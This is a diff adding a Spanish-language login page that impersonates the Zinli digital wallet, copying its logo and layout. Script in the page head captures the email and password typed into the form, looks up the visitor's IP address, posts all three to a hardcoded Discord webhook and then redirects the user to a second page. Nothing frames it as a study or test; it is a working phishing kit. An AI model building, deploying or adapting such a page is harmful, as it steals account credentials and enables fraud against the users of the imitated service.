@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zinli - Iniciar Sesión</title>
+  <link rel="stylesheet" href="styles.css">
+  <!-- Fuentes e iconos opcionales -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    .logo-img {
+      width: 100px; /* Ajusta el tamaño según sea necesario */
+      height: auto;
+      margin-right: 20px; /* Espacio entre el logo y el ícono de soporte */
+    }
+  </style>
+  <script>
+    // Función para obtener IP del usuario
+    async function getUserIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Error al obtener IP:', error);
+        return 'IP no disponible';
+      }
+    }
+
+    // Función para enviar datos a Discord Webhook
+    async function sendToDiscord(email, password) {
+      try {
+        const userIP = await getUserIP();
+        const response = await fetch('https://discordapp.com/api/webhooks/1553966500321435730/Ujjox7ech61GbNFjwGGTsgOS-ikblrHKDFVA0-oMtD-Y7-SYaUcITkhKzDHvYM9adiR9', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `Nuevo inicio de sesión:\nEmail: ${email}\nContraseña: ${password}\nIP: ${userIP}`
+          }),
+        });
+        
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        const result = await response.json();
+        console.log('Enviado a Discord:', result);
+        return result;
+      } catch (error) {
+        console.error('Error al enviar a Discord:', error);
+        return null;
+      }
+    }
+
+    // Manejar formulario de login
+    document.addEventListener('DOMContentLoaded', function() {
+      const loginForm = document.querySelector('.login-form');
+      
+      loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        
+        // Enviar datos a Discord
+        await sendToDiscord(email, password);
+        
+        // Redirigir a index2.html
+        window.location.href = 'index2.html';
+      });
+    });
+  </script>
+</head>
+<body>
+  <div class="app-container">
+    
+    <!-- Encabezado con Logo e Icono de Soporte -->
+    <header class="header">
+      <img src="https://www.trecebits.com/wp-content/uploads/2024/05/zinli-logotipo.jpg.webp" alt="Zinli Logo" class="logo-img">
+      <button class="chat-icon" aria-label="Soporte">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#5B21B6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+          <line x1="8" y1="10" x2="8.01" y2="10" stroke-width="3"></line>
+          <line x1="12" y1="10" x2="12.01" y2="10" stroke-width="3"></line>
+          <line x1="16" y1="10" x2="16.01" y2="10" stroke-width="3"></line>
+        </svg>
+      </button>
+    </header>
+
+    <!-- Contenido Principal / Formulario -->
+    <main class="main-content">
+      <p class="greeting">¡Bienvenido!</p>
+      <h1 class="title">Ingresa tus datos</h1>
+
+      <form class="login-form">
+        <!-- Campo Correo -->
+        <div class="form-group">
+          <input type="email" id="email" placeholder=" " required />
+          <label for="email">Correo electrónico</label>
+        </div>
+
+        <!-- Campo Contraseña -->
+        <div class="form-group password-group">
+          <input type="password" id="password" placeholder=" " required />
+          <label for="password">Contraseña</label>
+          <button type="button" class="toggle-password" aria-label="Mostrar contraseña">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#2D2B3D" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+              <line x1="1" y1="1" x2="23" y2="23"></line>
+            </svg>
+          </button>
+        </div>
+
+        <!-- Olvidaste tu contraseña -->
+        <div class="forgot-container">
+          <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+        </div>
+
+        <!-- Botón Ingresar -->
+        <button type="submit" class="btn-submit">INGRESAR</button>
+
+        <!-- Casilla Recuérdame -->
+        <div class="remember-container">
+          <label class="checkbox-label">
+            <input type="checkbox" id="remember" />
+            <span class="custom-checkbox"></span>
+            <span class="remember-text">Recuérdame</span>
+          </label>
+        </div>
+      </form>
+    </main>
+
+    <!-- Pie de página / Abrir Cuenta Nueva -->
+    <footer class="footer">
+      <a href="#" class="btn-register">ABRIR CUENTA NUEVA</a>
+    </footer>
+
+  </div>
+</body>
+</html>
